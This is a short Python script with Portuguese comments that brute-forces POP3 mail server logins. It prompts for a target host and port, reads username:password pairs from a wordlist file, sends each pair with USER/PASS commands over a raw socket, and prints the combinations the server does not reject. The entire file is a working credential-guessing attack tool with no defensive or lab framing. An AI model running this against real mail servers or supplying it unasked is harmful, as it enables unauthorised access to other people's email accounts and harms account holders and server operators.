import socket
from re import search
#### import o sleep para o server não ter uma capacidade de conexão exercida ###
from time import sleep


### vou só deixar o código mais bonitinho para fazer o upload...

BLACK   = '\033[30m'
RED     = '\033[31m'
GREEN   = '\033[32m'
YELLOW  = '\033[33m'
BLUE    = '\033[34m'
MAGENTA = '\033[35m'
CYAN    = '\033[36m'
WHITE   = '\033[37m'
RESET   = '\033[39m'

### Não estou acostumado a botar cores no meu código 
host = str(input(f'{GREEN}Digite o host: {CYAN}'))
porta = int(input(f'{GREEN}Digite a porta:  {CYAN}'))
class pop3_brute:
    def __init__(self,lista0,lista1):
        socket.timeout(5)
        pop3 = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        pop3.connect((host,porta))
        ### muito try e except ###
        try:
            pop3.recv(1234).decode()
            pop3.send(f'USER {lista0}\r\n'.encode())
            pop3.recv(1234).decode()
            pop3.send(f'PASS {lista1}\r\n'.encode())
            ver = pop3.recv(1234).decode()
            if search('failed',ver):
                print(f'{RED}failed , tentando ...')
            elif search('DENIED ',ver):
                pass     
            elif search('incorrect',ver):
                 print(f'{RED}failed , tentando ...')
            elif search('503',ver):
                 print(f'{RED}failed , tentando ...') 
            else:
               
                print(f'{MAGENTA}USER : {BLUE}{lista0}\n{MAGENTA}Password : {BLUE}{lista1}')               
        except:
            print('nao respondeu...')
        pop3.close()
      #  sleep(1)                      
        
#pop3_brute('lisra') 

pop3_lists = open('listahashftp.txt','r') ## peguei a lista do ftp porque não tinha uma lista de pop3##
for passed in pop3_lists:
    remove= passed
    usuário = remove.split(':')[0].lstrip().rstrip()
    senha = remove.split(':')[1].lstrip().rstrip()
    pop3_brute(usuário,senha)
   